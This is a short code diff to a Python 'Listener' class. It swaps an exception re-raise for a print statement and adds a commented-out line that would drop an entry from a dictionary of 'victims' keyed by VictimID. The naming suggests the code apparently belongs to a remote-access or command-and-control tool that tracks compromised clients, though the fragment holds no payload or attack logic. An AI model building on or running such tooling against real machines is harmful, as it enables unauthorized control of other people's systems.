@@ -228,7 +228,9 @@ class Listener:
             del clnt
 
         except Exception as ex:
-            raise ex
+            #raise ex
+            #self.dic_victim.pop(clnt.VictimID)
+            print(ex)
         
     def get_victims(self) -> dict:
         return self.dic_victim
